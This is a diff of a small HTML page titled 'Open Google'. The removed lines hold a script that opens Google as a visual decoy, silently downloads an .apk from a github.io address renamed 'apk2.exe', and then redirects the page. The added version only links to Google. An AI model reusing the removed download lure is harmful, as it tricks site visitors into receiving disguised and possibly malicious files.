@@ -1,28 +1,29 @@
-<!-- Peace Be Upon You -->
-<!-- Puf -->
-<script language="javascript">
+<!-- open-google.html -->
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Open Google</title></head>
+<body>
+<center><h2>Peace Be Upon You</h2></center>
+
+<script>
 function Puf(uri, name) {
   var link = document.createElement("a");
   link.download = name;
   link.href = uri;
+  // jika href adalah halaman web, klik akan menavigasi (atau membuka tab jika target)
+  link.target = "_self"; // atau "_blank" untuk tab baru
   link.click();
 }
 
-function openWin() {
-  // Membuka google.com di tab baru untuk ilusi visual
-  window.open('https://google.com', 'x');
-  
-  // Memulai unduhan dari frozzipies.github.io setelah jeda 1 detik
-  setTimeout(function() {
-    Puf("https://frozzipies.github.io/test.apk", "apk2.exe");
-  }, 1000);
-  
-  // Redirect halaman utama ke google.com setelah 2 detik
-  setTimeout(function() {
-    location.replace("https://google.com");
-  }, 2000);
+function openWin()
+{
+  // ganti data:... menjadi google.com
+  Puf("https://google.com", "ignored-filename");
+  // jika mau redirect setelah klik:
+  // location.replace("https://google.com");
 }
 </script>
-<center><h2>Peace Be Upon You</h2></center>
 
 <input type="button" onclick="openWin();" value="open"/>
+</body>
+</html>
